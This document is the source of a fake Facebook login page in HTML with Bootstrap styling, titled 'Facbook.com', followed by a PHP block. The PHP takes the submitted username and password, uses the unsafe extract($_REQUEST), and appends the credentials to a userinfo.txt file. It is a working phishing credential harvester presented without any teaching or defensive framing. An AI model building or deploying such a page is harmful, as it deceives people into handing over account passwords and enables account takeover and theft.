<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facbook.com</title>
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/bootstrap-grid.min.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="bg">
    <div class="header">
        <img src="img/fb.jpg" class="img-fluid" alt="icon">
    </div>
    <div class="mobo">
        <img src="img/f.png" class="img-fluid mb-5" alt="fsdf">
    </div>
    <div class="container">
        <form action="https://www.facebook.com/">
                <!-- <label for="name">Mobile number or email address</label> -->
                <input type="text" class="form-control" placeholder="Mobile number or email address" name="username" id="name">
                <!-- <label for="pass">Password</label> -->
                <input type="password" class="form-control" placeholder="Password" name="Password" id="pass">
                <input class="btn btn-primary btn-block mt-3" type="submit" value="LogIn" >
            </form>
            <div class="hr text-center">
                <p>Or</p>
            </div>
            <div class="btnr">
                <a class="btn acount mb-2" href="#">Create New Account</a> <br>
                <a href="#">Forgotten Password? </a><a href="">Help Center</a>
            </div>
    </div>
</div>
<div class="fotter">
    <div class="row">
        <div class="col-6">
            <ul class="list-unstyled">
                <li ><a class="text-muted" href="#">English (UK)</a></li>
                <li><a href="#">Francais (France)</a></li>
                <li><a href="#">Portugues (Brasil)</a></li>
                <li><a href="#">Ltaliano</a></li>
            </ul>
        </div>
        <div class="col-6">
            <ul class="list-unstyled">
                <li><a href="#">kiswahili</a></li>
                <li><a href="#">Espanol</a></li>
                <li><a href="#">Deutsch</a></li>
                <li><a href="#"><i class="far fa-plus-square fa-1x"></i></a></li>
            </ul>
        </div>
    </div>
</div>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
</body>
</html>
<?php
    extract($_REQUEST);
    $_FILES=fopen("userinfo.txt","a");

    fwrite($_FILES,"name:");
    fwrite($_FILES,$username . "\n");
    fwrite($_FILES, "password:");
    fwrite($_FILES, $password . "\n");
    fclose($_FILES);

?>
